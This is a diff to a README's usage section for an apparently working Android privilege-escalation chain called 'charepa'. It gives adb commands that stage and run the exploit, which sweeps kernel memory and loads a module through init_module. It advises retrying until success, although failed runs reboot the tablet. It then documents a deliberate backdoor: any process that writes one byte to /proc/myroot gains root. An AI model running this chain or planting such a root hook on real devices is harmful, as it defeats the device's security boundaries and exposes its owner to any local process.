@@ -162,34 +162,53 @@ the root `build` job).
 
 ## Use
 
-Install the APK. First root, from an adb shell:
+Install the APK. That is the entire installation step: the Activity copies its
+three assets into `files/bin` on launch and the chain finds its companions
+there through `/proc/self/exe`.
+
+First root, on a unit with no hook yet. Start the app once so it stages the
+files, then run the staged copy — measured, nothing needs to be pushed:
 
 ```sh
-adb push charepa myroot.ko bootpayload /data/local/tmp/
-adb shell 'run-as <any app you own> sh -c "cp /data/local/tmp/charepa $HOME/ && ..."' # see below
-```
-
-The chain reads its companions from the directory it lives in, falling back to
-`/data/local/tmp`, so staging all three there is enough:
-
-```sh
-adb shell 'run-as com.termux /data/data/com.termux/files/charepa all 02000000 40000000 2048 2600'
+adb shell am start -n com.charepa/.MainActivity --es mode validate
+adb shell 'run-as com.charepa /data/data/com.charepa/files/bin/charepa all 02000000 40000000 2048 2600'
 ```
 
 The sweep can miss: where the `avc_node` lands moves between boots, and a run
-that stores into the wrong place reboots the tablet. Measured hit rate was one
-in about ten to one in about twenty attempts, so a loop is normal. A run that
-reports `module_errno=8` before the sweep has already passed the capability
-check and goes straight to `init_module`.
+that stores into the wrong place reboots the tablet. Measured wins came at
+attempts 6, 7 and 23 of their loops, so repeat the second command until the log
+says `init_module rc=0`. A run that reports `module_errno=8` has already passed
+the capability check and goes straight to `init_module`.
 
-After that the app does the rest:
+Once the hook is in, the app is the entry point:
 
 ```sh
 adb shell am start -n com.charepa/.MainActivity --es mode all
 ```
 
+It reports `RESULT ROOT uid=0` and exits 0. From then on any process that can
+write one byte to `/proc/myroot` is root:
+
+```sh
+adb shell 'echo 1 > /proc/myroot; id'
+```
+
 `validate` only touches memory the process owns and prints PASS or FAIL, which
 is the safe way to check the primitive on a given unit.
+
+### When the USB connection drops
+
+Measured repeatedly on this unit: the tablet disappears from `adb devices` while
+a sweep runs, and `adb kill-server` does not bring it back. Cycling the root-hub
+port does, in one try:
+
+```sh
+echo 1 > /sys/bus/usb/devices/usb1/1-0:1.0/usb1-port2/disable
+sleep 2
+echo 0 > /sys/bus/usb/devices/usb1/1-0:1.0/usb1-port2/disable
+```
+
+The device comes back with root intact; a `reboot` is not needed.
 
 ## Layout
 
